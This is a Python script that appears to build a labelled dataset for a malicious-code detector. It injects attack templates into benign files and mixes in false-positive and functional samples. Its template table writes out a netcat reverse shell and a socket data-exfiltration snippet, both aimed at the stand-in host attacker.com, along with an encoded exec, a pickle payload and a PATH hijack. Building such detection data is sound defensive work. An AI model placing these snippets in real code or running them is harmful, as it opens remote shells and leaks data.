import os
import json
import random
import subprocess
import tempfile
import uuid
from pathlib import Path

# ============================================================
# Attack Templates for Mutation Engine (Track B)
# ============================================================
ATTACK_TEMPLATES = {
    "typosquatting": {
        "inject": "import pythonn\n\n",
        "patch": "",
    },
    "obfuscated_exec": {
        "inject": "exec(base64.b64decode('cHJpbnQoIkhlbGxvIGZyb20gaGlkZGVuIGV4ZWMhIik='))\n\n",
        "patch": "",
    },
    "env_hijack": {
        "inject": "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\n",
        "patch": "",
    },
    "subprocess_backdoor": {
        "inject": "import subprocess\ntry:\n    subprocess.call(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])\nexcept:\n    pass\n\n",
        "patch": "",
    },
    "eval_hidden": {
        "inject": "def safe_eval(x):\n    return eval(x)\nsafe_eval('__import__(\"os\").system(\"echo 1\")')\n\n",
        "patch": "",
    },
    "pickle_deserialization": {
        "inject": "import pickle\npickle.loads(b\"c__builtin__\\neval\\n(Vprint('malicious')\\ntR.\")\n\n",
        "patch": "",
    },
    "socket_exfil": {
        "inject": "import socket\ntry:\n    s = socket.socket()\n    s.connect(('attacker.com', 80))\n    s.sendall(b'exfiltrated data')\nexcept:\n    pass\n\n",
        "patch": "",
    },
    "malicious_import": {
        "inject": "__import__('os').system('echo pwned > /tmp/pwned')\n\n",
        "patch": ""
    }
}

def load_benign_files(benign_dir):
    files_data = []
    if not os.path.exists(benign_dir):
        return files_data
    for filename in os.listdir(benign_dir):
        if filename.endswith(".py"):
            with open(os.path.join(benign_dir, filename), "r") as f:
                content = f.read()
                files_data.append({"filename": filename, "code": content})
    return files_data

def auto_generate_unit_test(filename, code):
    """Generates a simple unit test that passes when run against the patched code."""
    test_code = "import code\n"
    if "fibonacci" in code:
        test_code += "assert code.fibonacci(5) == 5\n"
    elif "factorial" in code:
        test_code += "assert code.factorial(5) == 120\n"
    elif "is_prime" in code:
        test_code += "assert code.is_prime(7) == True\n"
    elif "gcd" in code:
        test_code += "assert code.gcd(48, 18) == 6\n"
    elif "is_palindrome" in code:
        test_code += "assert code.is_palindrome('racecar') == True\n"
    elif "celsius_to_fahrenheit" in code:
        test_code += "assert code.celsius_to_fahrenheit(0) == 32\n"
    else:
        # Minimal test: just ensure the module loads without error
        test_code += "assert True  # module loaded successfully\n"
    return test_code

def generate_track_b_scenarios(benign_files, num_examples=40):
    """Track B: Custom mutation engine (always used)."""
    scenarios = []
    # True Positives (20)
    for i in range(20):
        bf = random.choice(benign_files)
        attack_name, attack_data = random.choice(list(ATTACK_TEMPLATES.items()))
        malicious_code = attack_data["inject"] + bf["code"]
        test_code = auto_generate_unit_test(bf["filename"], bf["code"])
        scenarios.append({
            "id": f"tp_{uuid.uuid4().hex[:8]}",
            "type": "true_positive",
            "code_snippet": malicious_code,
            "patch": bf["code"],
            "unit_test_code": test_code,
            "label": "malicious",
            "source": "mutation_engine",
            "attack_type": attack_name
        })
    # False Positives (10)
    fp_templates = [
        ("fp_eval", "def safe_calc(expr):\n    # Legit eval in controlled env\n    return eval(expr, {'__builtins__': {}}, {})\n\n"),
        ("fp_requests", "import requests\n# Just checking internet\ntry:\n    requests.get('https://8.8.8.8', timeout=1)\nexcept:\n    pass\n\n"),
        ("fp_os_environ", "import os\n# Setup proxy\nos.environ['HTTP_PROXY'] = 'http://proxy.local:8080'\n\n"),
        ("fp_base64", "import base64\ndef encode_msg(msg):\n    return base64.b64encode(msg.encode())\n\n")
    ]
    for i in range(10):
        bf = random.choice(benign_files)
        fp_name, fp_code = random.choice(fp_templates)
        suspicious_code = fp_code + bf["code"]
        test_code = auto_generate_unit_test(bf["filename"], bf["code"])
        scenarios.append({
            "id": f"fp_{uuid.uuid4().hex[:8]}",
            "type": "false_positive",
            "code_snippet": suspicious_code,
            "patch": None,
            "unit_test_code": test_code,
            "label": "benign",
            "source": "mutation_engine",
            "attack_type": None
        })
    # Functional (10)
    for i in range(10):
        bf = random.choice(benign_files)
        test_code = auto_generate_unit_test(bf["filename"], bf["code"])
        scenarios.append({
            "id": f"fn_{uuid.uuid4().hex[:8]}",
            "type": "functional",
            "code_snippet": bf["code"],
            "patch": None,
            "unit_test_code": test_code,
            "label": "benign",
            "source": "mutation_engine",
            "attack_type": None
        })
    return scenarios

def generate_track_a_scenarios_with_sdk(output_dir: str, num_samples: int = 10):
    """
    Track A: Use Meta's synthetic-data-kit to generate high-quality code examples.
    Follows the 4-stage pipeline: ingest -> create -> curate -> save-as
    """
    sdk_scenarios = []
    
    # Check if synthetic-data-kit CLI is available
    try:
        subprocess.run(["synthetic-data-kit", "--help"], capture_output=True, check=True)
    except (subprocess.SubprocessError, FileNotFoundError):
        print("⚠️ Meta synthetic-data-kit CLI not found. Track A disabled.")
        return sdk_scenarios
    
    # Path to our SDK config
    config_path = Path(__file__).parent / "sdk_config.yaml"
    if not config_path.exists():
        print(f"⚠️ SDK config not found at {config_path}. Track A disabled.")
        return sdk_scenarios

    # Create a temporary directory for the SDK workspace
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        workspace_dir = tmp_path / "sdk_workspace"
        workspace_dir.mkdir()
        
        # 1. Ingest (We'll ingest the benign files as seeds)
        try:
            benign_dir = Path(__file__).parent / "benign"
            if benign_dir.exists():
                subprocess.run(
                    ["synthetic-data-kit", "ingest", str(benign_dir), "--output", str(workspace_dir / "ingested")],
                    check=True, capture_output=True
                )
            
            # 2. Create (Generate synthetic examples)
            subprocess.run(
                ["synthetic-data-kit", "create", str(workspace_dir / "ingested"), 
                 "--type", "qa", "-c", str(config_path), "--output", str(workspace_dir / "created")],
                check=True, capture_output=True, timeout=600
            )
            
            # 3. Curate (Filter low-quality examples)
            subprocess.run(
                ["synthetic-data-kit", "curate", str(workspace_dir / "created"), 
                 "--output", str(workspace_dir / "curated")],
                check=True, capture_output=True
            )
            
            # 4. Save-As (Export to JSON)
            output_json = workspace_dir / "final_sdk.json"
            subprocess.run(
                ["synthetic-data-kit", "save-as", str(workspace_dir / "curated"), 
                 "--format", "json", "--output", str(output_json)],
                check=True, capture_output=True
            )
            
            # Load generated data and convert to our format
            if output_json.exists():
                with open(output_json, "r") as f:
                    data = json.load(f)
                for item in data:
                    # Expecting keys based on sdk_config.yaml prompts
                    sdk_scenarios.append({
                        "id": f"tp_sdk_{uuid.uuid4().hex[:8]}",
                        "type": "true_positive" if item.get("patch") else "functional",
                        "code_snippet": item.get("code_snippet") or item.get("code"),
                        "patch": item.get("patch"),
                        "unit_test_code": item.get("unit_test_code", "import code\nassert True"),
                        "label": "malicious" if item.get("patch") else "benign",
                        "source": "synthetic_data_kit",
                        "attack_type": item.get("attack_type", "llm_generated")
                    })
        except subprocess.TimeoutExpired:
            print("⚠️ SDK generation timed out.")
        except subprocess.CalledProcessError as e:
            print(f"⚠️ SDK command failed: {e.stderr.decode() if e.stderr else 'Unknown error'}")
    
    return sdk_scenarios

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--benign-dir", type=str, default="sentinel_synth/data/benign/")
    parser.add_argument("--output", type=str, default="sentinel_synth/data/scenarios.json")
    parser.add_argument("--use-sdk", action="store_true", help="Use Meta synthetic-data-kit (requires `synth` CLI)")
    parser.add_argument("--sdk-samples", type=int, default=10, help="Number of SDK samples to generate")
    args = parser.parse_args()

    benign_files = load_benign_files(args.benign_dir)
    if not benign_files:
        print(f"No benign files found in {args.benign_dir}. Create some first.")
        return

    # Start with Track B scenarios (mutation engine)
    scenarios = generate_track_b_scenarios(benign_files, 40)
    
    # Add Track A (Meta SDK) if requested
    if args.use_sdk:
        # Note: output_dir is passed implicitly via creating a temp dir inside the fxn now
        # the argument `args.output` is where final aggregated data is saved
        sdk_scenarios = generate_track_a_scenarios_with_sdk(os.path.dirname(args.output), args.sdk_samples)
        scenarios.extend(sdk_scenarios)
        if sdk_scenarios:
            print(f"Added {len(sdk_scenarios)} SDK-generated scenarios.")
    
    # Shuffle and save
    random.shuffle(scenarios)
    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    with open(args.output, "w") as f:
        json.dump(scenarios, f, indent=4)
    
    print(f"Total scenarios: {len(scenarios)}")
    print(f"  Malicious: {len([s for s in scenarios if s['label'] == 'malicious'])}")
    print(f"  Benign:    {len([s for s in scenarios if s['label'] == 'benign'])}")
    print(f"Saved to {args.output}")

if __name__ == "__main__":
    main()
